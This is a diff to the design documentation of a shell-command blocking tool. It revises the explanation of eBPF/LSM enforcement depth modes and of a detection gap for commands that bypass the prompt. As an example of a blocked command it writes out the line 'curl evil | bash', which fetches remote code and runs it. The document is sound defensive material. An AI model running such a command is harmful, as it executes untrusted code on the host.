@@ -573,38 +573,42 @@ does and doesn't stop:
   gates a flagged process's *direct* children.** Why that's the default
   is a deliberate decision worth not re-litigating — the full analysis +
   measurements are in [`benchmarking.md`](benchmarking.md):
-  - **Detection is per-execve, not per-tree.** The `sys_enter_execve`
-    tracepoint reports *every* execve to the daemon, which classifies
-    each and may mark the PID; the LSM then gates that PID's next child.
-    So a *linear* deep chain is still covered — `npm`→`node`→`sh` is
-    inspected at every link, and whichever link trips a verdict has its
-    direct child blocked. You don't need a tree-walk to catch a chain
-    that execs straight down. (This corrects an earlier doc that claimed
-    `npm → node → sh` was simply uncovered.)
-  - **What `one_level` genuinely misses is *detachment*.** A flagged
-    process that **double-forks / `nohup … &` / daemonizes** reparents
-    its payload to PID 1 *before* the payload's execve, severing the
-    parent link the hook checks. That — not "deep descendants" in
-    general — is the real gap.
-  - **The deeper modes exist for exactly that, and cost is not the
-    blocker.** `ancestry(N)` walks N `real_parent` hops; `propagate_on
-    _fork` copies the mark across every fork so a detached descendant
-    still carries it. Both are runtime-selectable (`[enforcement]
-    depth`); measured overhead is negligible — ancestry(8) **+~111 ns/
-    execve**, propagate **+~49 ns/fork** (the dominant per-execve eBPF
-    cost is `trace_execve`'s arg-capture, ~2600 ns, and it's
-    mode-independent). So **cost is *not* why the default is shallow.**
-  - **`one_level` is the default for *precision*, not cost.** atty marks
-    the long-lived *shell* PID, sticky until the next clean line. Under
-    `one_level` that blocks exactly the commands typed in that window;
-    under `ancestry`/`propagate` it would block the shell's *entire*
-    descendant subtree for the window, false-blocking legitimate deep
-    processes for little gain over the per-execve detection net above.
-    The deeper modes become a *precise* default only once the proxy
-    marks the **command's** PID instead of the shell's (a tracked
-    follow-up). Until then: capability shipped + opt-in; default stays
-    `one_level`. Turn it up (`[enforcement] depth = "propagate_on_fork"`)
-    on high-security/CI hosts where over-blocking is acceptable.
+  - **Detection is proxy-only.** The daemon learns a command is
+    dangerous only when the atty prompt sends the *typed* command line
+    for classification. The kernel sees every execve but does **not**
+    classify them — the every-execve trace program was unconsumed and
+    has been removed. Nothing autonomously flags a command that didn't
+    go through the prompt.
+  - **`one_level` is complete for that model — which is why it's the
+    default.** atty marks the *shell* PID, and a flagged typed command
+    is the shell's *direct child*, so `one_level` blocks it at execve
+    before its subtree exists. `curl evil | bash` → `bash` is a direct
+    child, blocked, never runs the script. Blocking at the root makes
+    deeper modes moot under this policy — and `one_level` is also the
+    *precise* choice (it blocks exactly the typed commands during the
+    sticky window, where `ancestry`/`propagate` would sweep in the
+    shell's legitimate descendants too). Cost isn't the reason — every
+    depth is sub-µs.
+  - **The real gap is *detection* of non-proxy chains, and no depth
+    closes it.** A compromised dependency spawning `python → node →
+    exploit` at runtime never touches the prompt, so nothing marks it
+    and nothing blocks it — at *any* enforcement depth (there's no
+    marked ancestor to descend from). This is a detection gap, not a
+    depth gap; it's pinned by
+    `tests/sandbox/scenarios/58-ebpf-detection-gap`. Kernel-side
+    detection of prompt-bypassing execs is deliberately *not* built — it
+    would be a reactive, race-prone async loop (you can only block the
+    *next* execve, after the payload already ran); see the decision in
+    [`benchmarking.md`](benchmarking.md).
+  - **The deeper modes are infrastructure for a future policy.**
+    `ancestry(N)` (walk N `real_parent` hops) and `propagate_on_fork`
+    (the mark rides every fork, surviving double-fork detachment) are
+    runtime-selectable (`[enforcement] depth`) and near-free
+    (ancestry(8) +~120 ns/execve, propagate +~50 ns/fork). They become
+    meaningful once the proxy marks the **command's** PID and *allows*
+    it while containing its subtree — a tracked follow-up. Until then
+    they're opt-in (`depth = "propagate_on_fork"` suits high-security /
+    CI hosts where over-blocking is fine); the default stays `one_level`.
   - A *fresh* login (new SSH session, separate terminal, systemd
     service) starts an unclassified tree not covered until its own
     command trips a verdict.
